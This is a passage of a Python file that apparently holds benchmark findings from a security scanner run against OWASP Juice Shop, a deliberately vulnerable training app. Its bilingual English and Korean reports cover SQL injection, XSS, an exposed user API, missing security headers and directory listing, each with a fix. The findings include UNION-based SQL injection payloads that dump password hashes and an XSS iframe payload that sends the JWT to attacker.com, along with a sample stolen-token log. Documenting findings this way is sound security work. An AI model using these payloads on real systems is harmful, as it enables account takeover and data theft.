            "/rest/products/search?q= 제품 검색 엔드포인트가 SQLite 백엔드에 대한 SQL 인젝션(SQL Injection)에 취약합니다. "
            "애플리케이션은 Sequelize ORM을 사용하지만 검색 기능에서 raw query를 직접 구성합니다: "
            "models.sequelize.query(\"SELECT * FROM Products WHERE ((name LIKE '%\" + criteria + \"%') OR ...)\"). "
            "이로 인해 공격자가 LIKE 절을 벗어나 UNION SELECT 구문을 주입하여 "
            "이메일 주소와 bcrypt 비밀번호 해시를 포함한 Users 테이블 등 SQLite 데이터베이스의 모든 테이블에서 데이터를 추출할 수 있습니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: '))-- 검색으로 인젝션 확인 → LIKE 절이 종료되어 모든 제품 반환\n"
            "2단계: 컬럼 수 확인: q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--\n"
            "3단계: 테이블 열거: q='))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--\n"
            "4단계: 사용자 추출: q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--\n"
            "5단계: 결과에서 admin@juice-sh.op 및 bcrypt 해시($2a$12$...) 확인\n"
            "6단계: bcrypt 크래킹 시도 또는 알려진 약한 비밀번호 'admin123' 사용 → 관리자 로그인\n"
            "7단계: /administration 관리자 패널 접근 → 전체 애플리케이션 제어 권한 획득\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- bcrypt 비밀번호 해시를 포함한 전체 사용자 계정 추출\n"
            "- 관리자 계정 탈취 (admin@juice-sh.op)\n"
            "- 고객 PII 접근: 이름, 이메일 주소, 암호화된 결제 정보\n"
            "- 모든 SQLite 테이블에 대한 전체 읽기 접근 (Products, Feedback, BasketItems 등)\n"
            "- 주문 조작 및 금융 사기 가능성\n"
            "- GDPR/PCI-DSS 규정 위반\n\n"
            "개념 증명(PoC)\n"
            "요청: GET /rest/products/search?q='))UNION+SELECT+id,email,password,role,4,5,6,7,8+FROM+Users--\n"
            "응답 (JSON):\n"
            "  {\"id\":1,\"name\":\"admin@juice-sh.op\",\"description\":\"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS...\",\"price\":\"admin\"}\n"
            "  {\"id\":2,\"name\":\"jim@juice-sh.op\",\"description\":\"$2a$12$0gKjvM6vSFHXGhIm...\",\"price\":\"customer\"}\n"
            "  {\"id\":3,\"name\":\"bender@juice-sh.op\",\"description\":\"$2a$12$mZeJ7MJX...\",\"price\":\"customer\"}\n\n"
            "수정 방안(FIX)\n"
            "즉시: raw SQL 쿼리를 Sequelize ORM 쿼리로 교체: Products.findAll({ where: { name: { [Op.like]: '%' + criteria + '%' } } })\n"
            "단기: 입력 검증(Input Validation) 구현 — SQL 키워드 및 특수 문자가 포함된 검색 쿼리 거부.\n"
            "장기: Sequelize 쿼리 로깅 및 이상 탐지 활성화. SQL 인젝션(SQL Injection) 시그니처 매칭 WAF 배포. "
            "애플리케이션 전체의 모든 raw query 사용에 대한 포괄적 코드 감사(Code Audit) 수행.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "SQLi → Users 테이블 덤프 → admin@juice-sh.op 자격증명 → 관리자 패널 접근 → "
            "사용자 관리, 주문 조작, 애플리케이션 설정 탈취"
        ),
        severity=Severity.critical,
        target="http://localhost:3000",
        affected_component="/rest/products/search",
        port=3000,
        protocol="http",
        finding_type="sqli",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L",
            base_score=9.8,
        ),
        cwe_ids=["CWE-89"],
        mitre_attack=MitreAttack(
            tactic_id="TA0006",
            tactic_name="Credential Access",
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="SQLite Injection — UNION-based user extraction",
                content=(
                    "GET /rest/products/search?q='))UNION+SELECT+id,email,password,role,4,5,6,7,8+FROM+Users-- HTTP/1.1\n"
                    "Host: localhost:3000\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "{\"status\":\"success\",\"data\":[{\n"
                    "  \"id\":1,\"name\":\"admin@juice-sh.op\",\n"
                    "  \"description\":\"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS3Hg4pO2SxKzLwJiMHTRqJv1FZe\",\n"
                    "  \"price\":\"admin\"\n"
                    "},{\n"
                    "  \"id\":2,\"name\":\"jim@juice-sh.op\",\n"
                    "  \"description\":\"$2a$12$0gKjvM6vSFHXGhIm5y1pneNOgqr1N7qJkSFW3hB6dMJ2y5zqVKG\",\n"
                    "  \"price\":\"customer\"\n"
                    "},{\n"
                    "  \"id\":3,\"name\":\"bender@juice-sh.op\",\n"
                    "  \"description\":\"$2a$12$mZeJ7MJXsDe0v3GNMW7NKuL7sEPx5vCg\",\n"
                    "  \"price\":\"customer\"\n"
                    "}]}"
                ),
            ),
        ],
        remediation=(
            "Immediate: Replace raw query with Sequelize ORM parameterized query.|||즉시: raw query를 Sequelize ORM 파라미터화 쿼리(Parameterized Query)로 교체.\n"
            "Short-term: Input validation, reject SQL keywords.|||단기: 입력 검증(Input Validation) 구현, SQL 키워드 및 특수 문자가 포함된 검색 쿼리 거부.\n"
            "Long-term: WAF, query logging, comprehensive code audit.|||장기: SQL 인젝션 시그니처 매칭 WAF 배포, Sequelize 쿼리 로깅 및 이상 탐지 활성화, 전체 애플리케이션 raw query 사용에 대한 포괄적 코드 감사(Code Audit) 수행."
        ),
        references=[
            Reference(title="OWASP SQL Injection", url="https://owasp.org/www-community/attacks/SQL_Injection"),
            Reference(title="CWE-89: SQL Injection", url="https://cwe.mitre.org/data/definitions/89.html"),
        ],
    ),

    # ---- 2. Reflected XSS ----
    Finding(
        id="JUICE-002",
        scan_id="juice-bench-20260330",
        title="Reflected XSS via Search — DOM Injection via iframe|||검색을 통한 반사형 XSS — iframe DOM 주입",
        description=(
            "WHAT — Vulnerability Description\n"
            "The Juice Shop search functionality reflects the search query into the page DOM without proper sanitization. "
            "While Angular's built-in sanitization blocks direct <script> injection, it can be bypassed using <iframe> elements "
            "with srcdoc attribute or other HTML injection techniques. The search term is reflected in the results heading and "
            "the URL hash fragment, which Angular processes without server-side validation. "
            "This enables an attacker to inject arbitrary HTML including iframes that can execute JavaScript.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Inject iframe payload via search: /#/search?q=<iframe src=\"javascript:alert(document.cookie)\">\n"
            "Step 2: Angular renders the search results page with the iframe injected into the DOM\n"
            "Step 3: The iframe executes JavaScript in the context of the Juice Shop origin\n"
            "Step 4: Payload reads localStorage to extract the JWT token: localStorage.getItem('token')\n"
            "Step 5: JWT token is exfiltrated to attacker's server\n"
            "Step 6: Attacker uses the stolen JWT to make authenticated API calls as the victim\n\n"
            "IMPACT — Business Impact\n"
            "- JWT token theft from localStorage (Juice Shop stores auth tokens in localStorage)\n"
            "- Full account takeover via stolen JWT — attacker can impersonate any user\n"
            "- Shopping cart manipulation, order fraud\n"
            "- Customer PII access via authenticated API endpoints\n"
            "- Stored XSS potential if search terms are logged and displayed elsewhere\n\n"
            "PoC — Proof of Concept\n"
            "Payload: <iframe src=\"javascript:alert(`XSS`)\">\n"
            "Full URL: http://localhost:3000/#/search?q=<iframe src=\"javascript:alert(`XSS`)\">\n"
            "JWT theft payload: <iframe src=\"javascript:fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))\">\n\n"
            "FIX — Remediation\n"
            "Immediate: Move JWT storage from localStorage to HttpOnly cookies.\n"
            "Short-term: Implement DOMPurify sanitization on all search query reflections. "
            "Configure Angular's DomSanitizer to strip iframe elements.\n"
            "Long-term: Implement strict Content-Security-Policy that blocks inline scripts and iframes from untrusted sources. "
            "Add frame-src 'none' and script-src 'self' directives.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "XSS → JWT token theft from localStorage → authenticated API access → "
            "admin operations if admin token is stolen → full application compromise"
            "|||"
            "취약점 설명(WHAT)\n"
            "Juice Shop 검색 기능이 검색 쿼리를 적절한 새니타이징(Sanitization) 없이 페이지 DOM에 반영합니다. "
            "Angular의 내장 새니타이징이 직접적인 <script> 주입을 차단하지만, srcdoc 속성이 있는 <iframe> 요소나 "
            "기타 HTML 주입 기법을 사용하여 우회할 수 있습니다. 검색어는 결과 제목과 URL 해시 프래그먼트에 반영되며, "
            "Angular가 서버 측 검증 없이 이를 처리합니다. "
            "이를 통해 공격자가 JavaScript를 실행할 수 있는 iframe을 포함한 임의의 HTML을 주입할 수 있습니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: 검색을 통한 iframe 페이로드 주입: /#/search?q=<iframe src=\"javascript:alert(document.cookie)\">\n"
            "2단계: Angular가 iframe이 DOM에 주입된 검색 결과 페이지를 렌더링\n"
            "3단계: iframe이 Juice Shop 오리진(Origin) 컨텍스트에서 JavaScript를 실행\n"
            "4단계: 페이로드가 localStorage를 읽어 JWT 토큰 추출: localStorage.getItem('token')\n"
            "5단계: JWT 토큰이 공격자 서버로 유출\n"
            "6단계: 공격자가 탈취한 JWT를 사용하여 피해자로서 인증된 API 호출 수행\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- localStorage에서 JWT 토큰 탈취 (Juice Shop은 인증 토큰을 localStorage에 저장)\n"
            "- 탈취된 JWT를 통한 전체 계정 탈취 — 공격자가 모든 사용자를 사칭 가능\n"
            "- 장바구니 조작, 주문 사기\n"
            "- 인증된 API 엔드포인트를 통한 고객 PII 접근\n"
            "- 검색어가 다른 곳에 로깅 및 표시될 경우 저장형 XSS(Stored XSS) 가능성\n\n"
            "개념 증명(PoC)\n"
            "페이로드: <iframe src=\"javascript:alert(`XSS`)\">\n"
            "전체 URL: http://localhost:3000/#/search?q=<iframe src=\"javascript:alert(`XSS`)\">\n"
            "JWT 탈취 페이로드: <iframe src=\"javascript:fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))\">\n\n"
            "수정 방안(FIX)\n"
            "즉시: JWT 저장소를 localStorage에서 HttpOnly 쿠키로 이전.\n"
            "단기: 모든 검색 쿼리 반영에 DOMPurify 새니타이징 구현. Angular의 DomSanitizer를 설정하여 iframe 요소 제거.\n"
            "장기: 인라인 스크립트 및 신뢰할 수 없는 소스의 iframe을 차단하는 엄격한 Content-Security-Policy 구현. "
            "frame-src 'none' 및 script-src 'self' 지시문 추가.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "XSS → localStorage에서 JWT 토큰 탈취 → 인증된 API 접근 → "
            "관리자 토큰이 탈취된 경우 관리자 작업 수행 → 전체 애플리케이션 장악"
        ),
        severity=Severity.high,
        target="http://localhost:3000",
        affected_component="/#/search",
        port=3000,
        protocol="http",
        finding_type="xss",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
            base_score=8.2,
        ),
        cwe_ids=["CWE-79"],
        mitre_attack=MitreAttack(
            tactic_id="TA0001",
            tactic_name="Initial Access",
            technique_id="T1189",
            technique_name="Drive-by Compromise",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="XSS — iframe injection with JWT theft",
                content=(
                    "GET /#/search?q=<iframe+src=\"javascript:alert(document.cookie)\"> HTTP/1.1\n"
                    "Host: localhost:3000\n\n"
                    "--- DOM AFTER RENDERING ---\n"
                    "<span class=\"result-heading\">\n"
                    "  Search Results - <iframe src=\"javascript:alert(document.cookie)\"></iframe>\n"
                    "</span>\n\n"
                    "--- JWT THEFT VARIANT ---\n"
                    "<iframe src=\"javascript:fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))\">\n\n"
                    "Attacker server log:\n"
                    "GET /steal?t=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJhY3RpdmUiLCJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIn19"
                ),
            ),
        ],
        remediation=(
            "Immediate: Move JWT from localStorage to HttpOnly cookies.|||즉시: JWT 저장소를 localStorage에서 HttpOnly 쿠키로 이전하여 JavaScript 접근 방지.\n"
            "Short-term: DOMPurify sanitization, Angular DomSanitizer.|||단기: 모든 검색 쿼리 반영에 DOMPurify 새니타이징(Sanitization) 구현, Angular DomSanitizer로 iframe 요소 제거 설정.\n"
            "Long-term: Strict CSP with frame-src 'none'.|||장기: 인라인 스크립트 및 신뢰할 수 없는 소스의 iframe을 차단하는 엄격한 Content-Security-Policy 구현 (frame-src 'none', script-src 'self')."
        ),
        references=[
            Reference(title="OWASP XSS Prevention", url="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
        ],
    ),

    # ---- 3. Exposed User API ----
    Finding(
        id="JUICE-003",
        scan_id="juice-bench-20260330",
        title="Exposed User API — Unauthenticated User Enumeration|||노출된 사용자 API — 비인증 사용자 열거",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /api/Users endpoint is accessible without any authentication and returns the full user database including "
            "email addresses, hashed passwords, security question answers, and role assignments. "
            "The API is a standard Express.js REST endpoint backed by Sequelize that was intended for internal use only "
            "but was never restricted. Any unauthenticated attacker can enumerate all registered users, download their "
            "password hashes, and identify admin accounts.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: GET /api/Users → returns JSON array with all user objects\n"
            "Step 2: Identify admin accounts by role field (role: 'admin')\n"
            "Step 3: Extract bcrypt password hashes for offline cracking\n"
            "Step 4: Extract security question answers for account recovery attacks\n"
            "Step 5: Use cracked credentials or security answers to login as any user\n"
            "Step 6: Access admin panel at /administration with admin credentials\n\n"
            "IMPACT — Business Impact\n"
            "- Complete user database exposure without authentication\n"
            "- Offline password hash cracking (bcrypt — slow but possible for weak passwords)\n"
            "- Security question answers enable password reset attacks\n"
            "- User role enumeration (identifying admin accounts)\n"
            "- Mass PII exposure (email addresses, user metadata)\n"
            "- GDPR Article 5/32 violation — inadequate technical measures to protect personal data\n\n"
            "PoC — Proof of Concept\n"
            "Request: GET /api/Users HTTP/1.1 (no cookies, no auth header)\n"
            "Response (200 OK):\n"
            "  {\"data\":[{\n"
            "    \"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\n"
            "    \"password\":\"0192023a7bbd73250516f069df18b500\",\n"
            "    \"role\":\"admin\",\"totpSecret\":\"\",\n"
            "    \"securityAnswer\":{\"answer\":\"Samuel\"}\n"
            "  },{\n"
            "    \"id\":2,\"email\":\"jim@juice-sh.op\",\"role\":\"customer\",...\n"
            "  }]}\n\n"
            "FIX — Remediation\n"
            "Immediate: Add authentication middleware to /api/Users route. Restrict to admin role only.\n"
            "Short-term: Remove sensitive fields (password, securityAnswer, totpSecret) from the API response serializer. "
            "Implement rate limiting on the endpoint.\n"
            "Long-term: Implement proper RBAC across all API endpoints. Audit all Express routes for missing auth middleware. "
            "Use a field-level access control system (e.g., DTO transformation layer).\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Unauthenticated API access → user enumeration → password hash cracking → "
            "admin account login → application takeover"
            "|||"
            "취약점 설명(WHAT)\n"
            "/api/Users 엔드포인트가 인증 없이 접근 가능하며, 이메일 주소, 해시된 비밀번호, 보안 질문 답변, "
            "역할 할당 정보를 포함한 전체 사용자 데이터베이스를 반환합니다. "
            "이 API는 Sequelize 기반의 표준 Express.js REST 엔드포인트로 내부 전용으로 설계되었으나 "
            "접근 제한이 적용되지 않았습니다. 비인증 공격자가 모든 등록 사용자를 열거하고, "
            "비밀번호 해시를 다운로드하며, 관리자 계정을 식별할 수 있습니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: GET /api/Users → 모든 사용자 객체가 포함된 JSON 배열 반환\n"
            "2단계: role 필드로 관리자 계정 식별 (role: 'admin')\n"
            "3단계: 오프라인 크래킹을 위한 bcrypt 비밀번호 해시 추출\n"
            "4단계: 계정 복구 공격을 위한 보안 질문 답변 추출\n"
            "5단계: 크래킹된 자격증명 또는 보안 답변을 사용하여 임의 사용자로 로그인\n"
            "6단계: 관리자 자격증명으로 /administration 관리자 패널 접근\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 인증 없이 전체 사용자 데이터베이스 노출\n"
            "- 오프라인 비밀번호 해시 크래킹 (bcrypt — 느리지만 약한 비밀번호는 크래킹 가능)\n"
            "- 보안 질문 답변을 통한 비밀번호 재설정 공격 가능\n"
            "- 사용자 역할 열거 (관리자 계정 식별)\n"
            "- 대량 PII 노출 (이메일 주소, 사용자 메타데이터)\n"
            "- GDPR 제5/32조 위반 — 개인정보 보호를 위한 기술적 조치 부재\n\n"
            "개념 증명(PoC)\n"
            "요청: GET /api/Users HTTP/1.1 (쿠키 없음, 인증 헤더 없음)\n"
            "응답 (200 OK):\n"
            "  {\"data\":[{\n"
            "    \"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\n"
            "    \"password\":\"0192023a7bbd73250516f069df18b500\",\n"
            "    \"role\":\"admin\",\"totpSecret\":\"\",\n"
            "    \"securityAnswer\":{\"answer\":\"Samuel\"}\n"
            "  },{\n"
            "    \"id\":2,\"email\":\"jim@juice-sh.op\",\"role\":\"customer\",...\n"
            "  }]}\n\n"
            "수정 방안(FIX)\n"
            "즉시: /api/Users 라우트에 인증 미들웨어(Authentication Middleware) 추가. admin 역할만 접근 가능하도록 제한.\n"
            "단기: API 응답 시리얼라이저에서 민감한 필드(password, securityAnswer, totpSecret) 제거. "
            "엔드포인트에 속도 제한(Rate Limiting) 구현.\n"
            "장기: 모든 API 엔드포인트에 적절한 RBAC(역할 기반 접근 제어) 구현. 누락된 인증 미들웨어에 대한 전체 Express 라우트 감사. "
            "필드 레벨 접근 제어 시스템 도입 (예: DTO 변환 레이어).\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "비인증 API 접근 → 사용자 열거 → 비밀번호 해시 크래킹 → "
            "관리자 계정 로그인 → 애플리케이션 탈취"
        ),
        severity=Severity.high,
        target="http://localhost:3000",
        affected_component="/api/Users",
        port=3000,
        protocol="http",
        finding_type="broken-access-control",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            base_score=7.5,
        ),
        cwe_ids=["CWE-284", "CWE-200"],
        mitre_attack=MitreAttack(
            tactic_id="TA0007",
            tactic_name="Discovery",
            technique_id="T1087",
            technique_name="Account Discovery",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="Unauthenticated user data exposure — full dump",
                content=(
                    "GET /api/Users HTTP/1.1\n"
                    "Host: localhost:3000\n"
                    "(No authentication headers)\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "{\"status\":\"success\",\"data\":[{\n"
                    "  \"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\n"
                    "  \"password\":\"0192023a7bbd73250516f069df18b500\",\n"
                    "  \"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\n"
                    "  \"totpSecret\":\"\",\"isActive\":true,\n"
                    "  \"securityAnswer\":{\"id\":1,\"answer\":\"Samuel\"}\n"
                    "},{\n"
                    "  \"id\":2,\"username\":\"\",\"email\":\"jim@juice-sh.op\",\n"
                    "  \"password\":\"$2a$12$0gKjvM6vSFHXGhIm...\",\n"
                    "  \"role\":\"customer\"\n"
                    "}]}"
                ),
            ),
        ],
        remediation=(
            "Immediate: Add auth middleware, restrict to admin role.|||즉시: /api/Users 라우트에 인증 미들웨어(Authentication Middleware) 추가, admin 역할만 접근 가능하도록 제한.\n"
            "Short-term: Remove sensitive fields from response.|||단기: API 응답 시리얼라이저에서 민감한 필드(password, securityAnswer, totpSecret) 제거, 속도 제한(Rate Limiting) 구현.\n"
            "Long-term: RBAC audit across all API routes.|||장기: 모든 API 엔드포인트에 대한 포괄적 RBAC(역할 기반 접근 제어) 감사, 필드 레벨 접근 제어 시스템(DTO 변환 레이어) 도입."
        ),
        references=[
            Reference(title="OWASP Broken Access Control", url="https://owasp.org/Top10/A01_2021-Broken_Access_Control/"),
            Reference(title="CWE-284: Improper Access Control", url="https://cwe.mitre.org/data/definitions/284.html"),
        ],
    ),

    # ---- 4. Missing Security Headers ----
    Finding(
        id="JUICE-004",
        scan_id="juice-bench-20260330",
        title="Missing Security Headers — Insufficient Browser Security Controls|||보안 헤더 누락 — 불충분한 브라우저 보안 제어",
        description=(
            "WHAT — Vulnerability Description\n"
            "The Juice Shop application is missing several critical HTTP security headers that modern browsers use to enforce "
            "security policies. While the Express.js server includes some basic headers, the following are absent or misconfigured:\n\n"
            "1. Content-Security-Policy — No CSP header; allows inline scripts and arbitrary resource loading\n"
            "2. Strict-Transport-Security — No HSTS; vulnerable to SSL stripping attacks\n"
            "3. Permissions-Policy — No feature restrictions; camera, microphone, geolocation accessible to any script\n"
            "4. Referrer-Policy — Default policy leaks full URL in Referer header\n"
            "5. X-Content-Type-Options — Present but not enforced on all responses\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Without CSP: XSS payloads can load external scripts, exfiltrate data to any domain, and execute inline JavaScript "
            "without any browser-level restrictions.\n"
            "Without HSTS: Man-in-the-middle attacker on the same network can perform SSL stripping, downgrading HTTPS to HTTP "
            "and intercepting all traffic including authentication credentials.\n\n"
            "IMPACT — Business Impact\n"
            "- XSS exploitation is unrestricted (no CSP to limit damage)\n"
            "- JWT tokens in localStorage are freely exfiltrable\n"
            "- Network-level attacks can intercept authentication (no HSTS)\n"
            "- Clickjacking attacks against sensitive forms\n\n"
            "PoC — Proof of Concept\n"
            "$ curl -sI http://localhost:3000/ | grep -iE '(content-security|strict-transport|permissions|referrer)'\n"
            "X-Content-Type-Options: nosniff  (only this one is present, partially)\n\n"
            "FIX — Remediation\n"
            "Immediate: Add helmet.js middleware with strict configuration:\n"
            "  app.use(helmet({ contentSecurityPolicy: { directives: { defaultSrc: [\"'self'\"], scriptSrc: [\"'self'\"] } } }))\n"
            "Short-term: Configure HSTS with minimum 1 year max-age and includeSubDomains.\n"
            "Long-term: Enable CSP reporting to monitor policy violations. Submit to HSTS preload list.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Missing CSP directly amplifies the XSS finding (JUICE-002), allowing unrestricted data exfiltration."
            "|||"
            "취약점 설명(WHAT)\n"
            "Juice Shop 애플리케이션에 최신 브라우저가 보안 정책을 적용하기 위해 사용하는 여러 필수 HTTP 보안 헤더가 누락되거나 "
            "잘못 설정되어 있습니다. Express.js 서버가 일부 기본 헤더를 포함하지만 다음 항목이 부재합니다:\n\n"
            "1. Content-Security-Policy — CSP 헤더 없음; 인라인 스크립트 및 임의 리소스 로딩 허용\n"
            "2. Strict-Transport-Security — HSTS 없음; SSL 스트리핑(SSL Stripping) 공격에 취약\n"
            "3. Permissions-Policy — 기능 제한 없음; 카메라, 마이크, 위치정보가 모든 스크립트에 접근 가능\n"
            "4. Referrer-Policy — 기본 정책이 Referer 헤더를 통해 전체 URL을 제3자에게 유출\n"
            "5. X-Content-Type-Options — 존재하지만 모든 응답에서 적용되지 않음\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "CSP 없음: XSS 페이로드가 외부 스크립트를 로드하고, 모든 도메인으로 데이터를 유출하며, "
            "브라우저 레벨 제한 없이 인라인 JavaScript를 실행할 수 있습니다.\n"
            "HSTS 없음: 동일 네트워크의 중간자 공격자(Man-in-the-Middle)가 SSL 스트리핑을 수행하여 "
            "HTTPS를 HTTP로 다운그레이드하고 인증 자격증명을 포함한 모든 트래픽을 가로챌 수 있습니다.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- XSS 공격이 제한 없이 실행 가능 (CSP가 피해를 제한하지 않음)\n"
            "- localStorage의 JWT 토큰이 자유롭게 유출 가능\n"
            "- 네트워크 레벨 공격으로 인증 가로채기 가능 (HSTS 없음)\n"
            "- 민감한 양식에 대한 클릭재킹(Clickjacking) 공격 가능\n\n"
            "개념 증명(PoC)\n"
            "$ curl -sI http://localhost:3000/ | grep -iE '(content-security|strict-transport|permissions|referrer)'\n"
            "X-Content-Type-Options: nosniff  (이것만 존재, 부분적)\n\n"
            "수정 방안(FIX)\n"
            "즉시: 엄격한 설정으로 helmet.js 미들웨어 추가:\n"
            "  app.use(helmet({ contentSecurityPolicy: { directives: { defaultSrc: [\"'self'\"], scriptSrc: [\"'self'\"] } } }))\n"
            "단기: 최소 1년 max-age 및 includeSubDomains으로 HSTS 설정.\n"
            "장기: 정책 위반을 모니터링하기 위한 CSP 리포팅 활성화. HSTS preload 목록에 등록.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "CSP 누락이 XSS 취약점(JUICE-002)을 직접적으로 증폭시켜 무제한 데이터 유출을 허용합니다."
        ),
        severity=Severity.high,
        target="http://localhost:3000",
        affected_component="/",
        port=3000,
        protocol="http",
        finding_type="misconfig",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
            base_score=5.4,
        ),
        cwe_ids=["CWE-693"],
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_response_headers",
                title="Missing security headers scan",
                content=(
                    "HTTP/1.1 200 OK\n"
                    "X-Powered-By: Express\n"
                    "X-Content-Type-Options: nosniff\n"
                    "X-Frame-Options: SAMEORIGIN\n"
                    "Content-Type: text/html; charset=utf-8\n\n"
                    "MISSING:\n"
                    "  Content-Security-Policy: (not set) — XSS amplification risk\n"
                    "  Strict-Transport-Security: (not set) — SSL stripping risk\n"
                    "  Permissions-Policy: (not set) — browser feature abuse risk\n"
                    "  Referrer-Policy: (not set) — URL leakage risk"
                ),
            ),
        ],
        remediation=(
            "Immediate: helmet.js with strict CSP.|||즉시: 엄격한 Content-Security-Policy 설정과 함께 helmet.js 미들웨어 적용 (defaultSrc 'self', scriptSrc 'self').\n"
            "Long-term: CSP reporting, HSTS preload.|||장기: 정책 위반 모니터링을 위한 CSP 리포팅(Reporting) 활성화, HSTS preload 목록 등록, 최소 1년 max-age HSTS 설정."
        ),
        references=[
            Reference(title="OWASP Security Headers", url="https://owasp.org/www-project-secure-headers/"),
        ],
    ),

    # ---- 5. Directory Listing ----
    Finding(
        id="JUICE-005",
        scan_id="juice-bench-20260330",
        title="Directory Listing — /ftp Backup Files & Configuration Exposed|||디렉토리 리스팅 — /ftp 백업 파일 및 설정 노출",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /ftp directory on the Juice Shop server has directory listing enabled, exposing backup files, configuration documents, "
            "and internal business documents. Notable exposed files include:\n"
            "- acquisitions.md — internal M&A documentation\n"
            "- coupons_2013.md.bak — backup of coupon codes (potentially reusable)\n"
            "- eastere.gg — Easter egg file with encoded content\n"
            "- encrypt.pyc — compiled Python encryption module (reverse-engineerable)\n"
            "- incident-support.kdbx — KeePass password database (!)\n"
            "- package.json.bak — backup Node.js config with dependency versions\n"
            "- quarantine/ — subdirectory with quarantined files\n"
            "- suspicious_errors.yml — error log with potential internal information\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Browse to /ftp → directory listing reveals all files\n"
            "Step 2: Download package.json.bak → reveals all npm dependencies with exact versions\n"
            "Step 3: Cross-reference dependencies with npm audit → find known vulnerable packages\n"
            "Step 4: Download incident-support.kdbx → attempt to crack KeePass master password\n"
            "Step 5: Download encrypt.pyc → decompile to understand encryption logic\n"
            "Step 6: Download coupons_2013.md.bak → test old coupon codes for reuse\n\n"
            "IMPACT — Business Impact\n"
            "- Exposure of internal business documents (M&A strategy, incidents)\n"
            "- KeePass password database potentially contains production credentials\n"
            "- Application dependency information enables targeted supply chain attacks\n"
            "- Old coupon codes may still be valid for financial fraud\n"
            "- Encryption source code exposure undermines cryptographic security\n\n"
            "PoC — Proof of Concept\n"
            "Request: GET /ftp HTTP/1.1\n"
            "Response: HTML directory listing with downloadable files\n"
            "All files downloadable without authentication:\n"
            "  GET /ftp/package.json.bak → 200 OK (full dependency list)\n"
            "  GET /ftp/incident-support.kdbx → 200 OK (KeePass database)\n\n"
            "FIX — Remediation\n"
            "Immediate: Disable directory listing. Remove all backup and sensitive files from the web root.\n"
            "Short-term: Implement access control on /ftp directory. Add .htaccess or Express middleware to block listing.\n"
            "Long-term: Never store backup files, credentials databases, or internal documents in the web root. "
            "Implement a CI/CD check that scans for sensitive files in public directories.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Directory listing → package.json.bak download → dependency vulnerability identification → "
            "targeted exploitation. Also: KeePass database → credential cracking → internal system access"
            "|||"
            "취약점 설명(WHAT)\n"
            "Juice Shop 서버의 /ftp 디렉토리에 디렉토리 리스팅(Directory Listing)이 활성화되어 백업 파일, 설정 문서, "
            "내부 비즈니스 문서가 노출됩니다. 주요 노출 파일은 다음과 같습니다:\n"
            "- acquisitions.md — 내부 M&A(인수합병) 문서\n"
            "- coupons_2013.md.bak — 쿠폰 코드 백업 (재사용 가능성)\n"
            "- eastere.gg — 인코딩된 콘텐츠가 포함된 이스터 에그 파일\n"
            "- encrypt.pyc — 컴파일된 Python 암호화 모듈 (역공학 가능)\n"
            "- incident-support.kdbx — KeePass 비밀번호 데이터베이스 (!)\n"
            "- package.json.bak — 의존성 버전이 포함된 Node.js 설정 백업\n"
            "- quarantine/ — 격리된 파일이 있는 하위 디렉토리\n"
